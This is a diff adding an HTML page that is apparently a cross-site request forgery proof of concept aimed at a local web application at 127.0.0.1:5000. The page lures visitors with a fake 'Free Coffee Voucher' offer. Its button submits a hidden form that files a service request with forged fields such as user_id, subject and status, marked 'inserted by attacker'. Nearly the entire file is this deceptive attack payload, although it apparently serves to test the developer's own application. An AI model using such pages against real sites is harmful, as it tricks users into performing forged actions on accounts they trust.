@@ -1,0 +1,31 @@
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>Free Coffee Voucher!</title>
+  </head>
+  <body>
+    <h1>Claim Your Free Coffee Voucher!</h1>
+    <p>Just click the button below and we'll email you a free coffee voucher!</p>
+    <!-- Note the action URL should be where the form expects to receive the POST request -->
+    <form action="http://127.0.0.1:5000/" method="POST" id="maliciousForm" enctype="multipart/form-data" style="display:none;">
+      <input type="hidden" name="user_id" value="153" />
+      <!-- <input type="hidden" name="location_id" value="94" /> -->
+      <input type="hidden" name="domain" value="carpentry" />
+      <input type="hidden" name="subdomain" value="carpentry" /> 
+      <input type="hidden" name="subdomain2" value="services" /> 
+      <input type="hidden" name="location" value="8" />
+      <input type="hidden" name="building_name" value="8" />
+      <input type="hidden" name="room_no" value="8" />
+      <input type="hidden" name="location_description" value="CSRF" />
+      <input type="hidden" name="subject" value="Fake subject inserted by attacker" />
+      <input type="hidden" name="status" value="Pending" />
+      <input type="hidden" name="availability" value="Fake availability inserted by attacker" />
+      <input type="hidden" name="description" value="Fake description inserted by attacker" />
+
+      <!-- More fields can be added if needed -->
+    </form>
+    <button type="button" onclick="document.getElementById('maliciousForm').submit();">
+      Click Here
+    </button>
+  </body>
+  </html>
